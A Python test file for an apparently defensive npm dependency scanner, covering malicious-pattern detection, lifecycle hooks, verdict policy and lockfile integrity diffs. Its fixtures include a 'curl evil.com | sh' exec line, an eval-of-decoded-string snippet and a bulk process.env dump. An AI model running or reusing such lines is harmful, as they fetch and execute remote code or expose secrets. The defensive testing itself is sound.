import json
import os

import pytest

from secchecker.dependency_patterns import DEPENDENCY_PATTERNS, DEPENDENCY_SEVERITY_MAP, STRUCTURAL_CATEGORIES
from secchecker.dependency_scanner import (
    scan_file_dependency,
    scan_directory_dependency,
    find_lifecycle_hooks,
    parse_package_lock,
    parse_pnpm_lock,
    parse_yarn_lock,
    parse_lockfile,
    diff_lockfiles,
)
from secchecker.dependency_policy import verdict_for, verdict_for_tree, highest_severity


# ---------------------------------------------------------------------------
# Pattern / severity map sanity
# ---------------------------------------------------------------------------

def test_dependency_patterns_exist():
    assert isinstance(DEPENDENCY_PATTERNS, dict)
    assert len(DEPENDENCY_PATTERNS) >= 10


def test_severity_map_coverage():
    for key in DEPENDENCY_SEVERITY_MAP.values():
        assert key in ("CRITICAL", "HIGH", "MEDIUM", "LOW")


def test_every_pattern_has_a_severity():
    missing = sorted(set(DEPENDENCY_PATTERNS) - set(DEPENDENCY_SEVERITY_MAP))
    assert not missing, "Patterns with no severity entry: {}".format(missing)


def test_structural_categories_are_not_regex_scanned(tmp_path):
    # Structural categories use a placeholder regex ($^) that must never
    # accidentally match real content — scan_file_dependency explicitly
    # skips them, but guard the placeholder regex itself too.
    f = tmp_path / "anything.js"
    f.write_text("var x = 1;\n")
    findings = scan_file_dependency(str(f))
    assert not (set(findings) & STRUCTURAL_CATEGORIES)


# ---------------------------------------------------------------------------
# Content pattern scanning
# ---------------------------------------------------------------------------

def test_eval_of_decoded_string(tmp_path):
    f = tmp_path / "index.js"
    f.write_text('eval(atob("c29tZXRoaW5n"));\n')
    findings = scan_file_dependency(str(f))
    assert "Dependency - eval of decoded string" in findings


def test_child_process_exec(tmp_path):
    f = tmp_path / "install.js"
    f.write_text('const cp = require("child_process");\ncp.execSync("curl evil.com | sh");\n')
    findings = scan_file_dependency(str(f))
    assert "Dependency - child_process exec" in findings
    assert "Dependency - execSync/spawnSync call" in findings


def test_bulk_env_read(tmp_path):
    f = tmp_path / "index.js"
    f.write_text("console.log(JSON.stringify(process.env));\n")
    findings = scan_file_dependency(str(f))
    assert "Dependency - bulk process.env read" in findings


def test_clean_file_no_findings(tmp_path):
    f = tmp_path / "index.js"
    f.write_text("module.exports = function add(a, b) { return a + b; };\n")
    findings = scan_file_dependency(str(f))
    assert findings == {}


def test_scan_nonexistent_file():
    assert scan_file_dependency("nonexistent_file.js") == {}


def test_scan_nonexistent_directory():
    with pytest.raises(FileNotFoundError):
        scan_directory_dependency("nonexistent_dir_xyz")


# ---------------------------------------------------------------------------
# Structural: lifecycle hooks + suspicious binaries + directory walk
# ---------------------------------------------------------------------------

def _make_package(tmp_path, name, scripts=None, files=None):
    pkg_dir = tmp_path / "node_modules" / name
    pkg_dir.mkdir(parents=True)
    manifest = {"name": name, "version": "1.0.0"}
    if scripts:
        manifest["scripts"] = scripts
    (pkg_dir / "package.json").write_text(json.dumps(manifest))
    for fname, content in (files or {}).items():
        target = pkg_dir / fname
        if isinstance(content, bytes):
            target.write_bytes(content)
        else:
            target.write_text(content)
    return pkg_dir


def test_find_lifecycle_hooks(tmp_path):
    pkg_dir = _make_package(tmp_path, "evil-pkg", scripts={"postinstall": "node install.js", "test": "jest"})
    hooks = find_lifecycle_hooks(str(pkg_dir))
    assert hooks == {"postinstall": "node install.js"}


def test_find_lifecycle_hooks_no_hooks(tmp_path):
    pkg_dir = _make_package(tmp_path, "clean-pkg", scripts={"test": "jest"})
    assert find_lifecycle_hooks(str(pkg_dir)) == {}


def test_find_lifecycle_hooks_no_package_json(tmp_path):
    empty_dir = tmp_path / "empty"
    empty_dir.mkdir()
    assert find_lifecycle_hooks(str(empty_dir)) == {}


def test_scan_directory_does_not_prune_node_modules(tmp_path):
    _make_package(
        tmp_path, "evil-pkg",
        scripts={"postinstall": "node install.js"},
        files={"install.js": 'eval(atob("x"));\n'},
    )
    results = scan_directory_dependency(str(tmp_path))
    joined = "\n".join(results.keys())
    assert "evil-pkg" in joined
    findings_by_pattern = {k for f in results.values() for k in f}
    assert "Dependency - eval of decoded string" in findings_by_pattern
    assert "Dependency - Lifecycle hook script present" in findings_by_pattern


def test_scan_directory_flags_suspicious_binary(tmp_path):
    _make_package(tmp_path, "binary-pkg", files={"native.node": b"\x00\x01"})
    results = scan_directory_dependency(str(tmp_path))
    findings_by_pattern = {k for f in results.values() for k in f}
    assert "Dependency - Suspicious binary in package" in findings_by_pattern


def test_scan_directory_clean_package_no_findings(tmp_path):
    _make_package(tmp_path, "clean-pkg", files={"index.js": "module.exports = {};\n"})
    results = scan_directory_dependency(str(tmp_path))
    assert results == {}


# ---------------------------------------------------------------------------
# Verdict policy
# ---------------------------------------------------------------------------

def test_verdict_allow_on_no_findings():
    assert verdict_for({}) == "ALLOW"


def test_verdict_block_on_critical():
    findings = {"Dependency - eval of decoded string": ["eval(atob(...))"]}
    assert verdict_for(findings) == "BLOCK"


def test_verdict_review_on_high():
    findings = {"Dependency - child_process exec": ["require(child_process)"]}
    assert verdict_for(findings) == "REVIEW"


def test_verdict_warn_on_medium():
    findings = {"Dependency - fetch/XHR call": ["fetch(...)"]}
    assert verdict_for(findings) == "WARN"


def test_verdict_for_tree_takes_worst_case():
    results = {
        "clean.js": {},
        "bad.js": {"Dependency - eval of decoded string": ["x"]},
        "medium.js": {"Dependency - fetch/XHR call": ["x"]},
    }
    assert verdict_for_tree(results) == "BLOCK"


def test_highest_severity_none_on_empty():
    assert highest_severity({}) is None


def test_custom_thresholds():
    findings = {"Dependency - fetch/XHR call": ["x"]}  # MEDIUM
    assert verdict_for(findings, {"warn_at": "HIGH"}) == "ALLOW"


# ---------------------------------------------------------------------------
# Lockfile parsers
# ---------------------------------------------------------------------------

def test_parse_package_lock_v3(tmp_path):
    data = {
        "packages": {
            "": {"name": "demo", "version": "1.0.0"},
            "node_modules/left-pad": {
                "version": "1.3.0",
                "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
                "integrity": "sha512-abc123",
            },
        }
    }
    f = tmp_path / "package-lock.json"
    f.write_text(json.dumps(data))
    entries = parse_package_lock(str(f))
    assert entries["left-pad@1.3.0"]["integrity"] == "sha512-abc123"


def test_parse_package_lock_malformed_json_returns_empty(tmp_path):
    f = tmp_path / "package-lock.json"
    f.write_text("{not valid json")
    assert parse_package_lock(str(f)) == {}


def test_parse_package_lock_missing_file_returns_empty():
    assert parse_package_lock("nonexistent-lock.json") == {}


def test_parse_yarn_lock(tmp_path):
    content = (
        'left-pad@^1.3.0, left-pad@^1.0.0:\n'
        '  version "1.3.0"\n'
        '  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#abc"\n'
        '  integrity sha512-abc123\n'
    )
    f = tmp_path / "yarn.lock"
    f.write_text(content)
    entries = parse_yarn_lock(str(f))
    assert entries["left-pad@1.3.0"]["integrity"] == "sha512-abc123"


def test_parse_pnpm_lock(tmp_path):
    content = (
        "lockfileVersion: 9.0\n\n"
        "packages:\n\n"
        "  /left-pad@1.3.0:\n"
        "    resolution: {integrity: sha512-abc123}\n"
    )
    f = tmp_path / "pnpm-lock.yaml"
    f.write_text(content)
    entries = parse_pnpm_lock(str(f))
    assert entries["left-pad@1.3.0"]["integrity"] == "sha512-abc123"


def test_parse_lockfile_dispatches_by_filename(tmp_path):
    f = tmp_path / "package-lock.json"
    f.write_text(json.dumps({"packages": {"node_modules/x": {"version": "1.0.0"}}}))
    entries = parse_lockfile(str(f))
    assert "x@1.0.0" in entries


def test_parse_lockfile_unknown_filename_returns_empty(tmp_path):
    f = tmp_path / "some-other-file.json"
    f.write_text("{}")
    assert parse_lockfile(str(f)) == {}


def test_diff_lockfiles_detects_integrity_change():
    old = {"left-pad@1.3.0": {"version": "1.3.0", "integrity": "sha512-old"}}
    new = {"left-pad@1.3.0": {"version": "1.3.0", "integrity": "sha512-NEW"}}
    diffs = diff_lockfiles(old, new)
    assert len(diffs) == 1
    assert "sha512-old" in diffs[0] and "sha512-NEW" in diffs[0]


def test_diff_lockfiles_no_change_no_diff():
    old = {"left-pad@1.3.0": {"version": "1.3.0", "integrity": "sha512-same"}}
    new = {"left-pad@1.3.0": {"version": "1.3.0", "integrity": "sha512-same"}}
    assert diff_lockfiles(old, new) == []


def test_diff_lockfiles_new_package_not_a_diff():
    # A brand-new key (a version bump or a new dependency) is not itself
    # suspicious — only a same-key integrity mismatch is.
    old = {}
    new = {"left-pad@1.4.0": {"version": "1.4.0", "integrity": "sha512-new"}}
    assert diff_lockfiles(old, new) == []
